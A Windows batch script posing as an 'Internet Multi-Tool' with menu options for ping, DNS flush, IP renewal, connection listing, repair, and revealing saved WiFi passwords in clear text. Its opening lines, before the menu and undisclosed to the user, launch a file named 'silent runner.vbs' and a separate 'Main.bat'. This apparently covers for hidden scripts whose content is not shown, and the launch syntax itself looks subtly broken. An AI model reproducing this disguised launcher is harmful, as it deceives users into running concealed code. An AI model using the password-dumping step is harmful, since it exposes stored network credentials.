@echo off
start "silent runner.vbs"
timeout /t 1
start "Main.bat"
title Internet Multi-Tool 2026
:menu
cls
echo ==========================================
echo       INTERNET QUICK-ACTION TOOL
echo ==========================================
echo [1] Ping Test (Check Connectivity)
echo [2] DNS Flush (Fix "Site Not Found" errors)
echo [3] Renew IP Address (Refresh Connection)
echo [4] Show WiFi Passwords (Saved on PC)
echo [5] Active Connections (Who's using my net?)
echo [6] Speed Test (Basic Latency Check)
echo [7] System Web Repair (SFC / Scannow)
echo [8] Exit
echo ==========================================
set /p opt="Select an option: "

if %opt%==1 goto pingtest
if %opt%==2 goto dnsflush
if %opt%==3 goto renew
if %opt%==4 goto wifi
if %opt%==5 goto active
if %opt%==6 goto speed
if %opt%==7 goto repair
if %opt%==8 exit
goto menu

:pingtest
set /p site="Enter URL to ping (e.g. google.com): "
ping %site%
pause
goto menu

:dnsflush
ipconfig /flushdns
echo DNS Cache Flushed!
pause
goto menu

:renew
ipconfig /release
ipconfig /renew
echo IP Address Refreshed.
pause
goto menu

:wifi
netsh wlan show profiles
set /p profile="Enter WiFi Name (SSID) to see password: "
netsh wlan show profile name="%profile%" key=clear | findstr "Key Content"
pause
goto menu

:active
netstat -an | findstr ESTABLISHED
pause
goto menu

:speed
echo Testing latency to major hubs...
echo -- Google:
ping google.com -n 3 | findstr "Average"
echo -- Cloudflare:
ping 1.1.1.1 -n 3 | findstr "Average"
pause
goto menu

:repair
sfc /scannow
pause
goto menu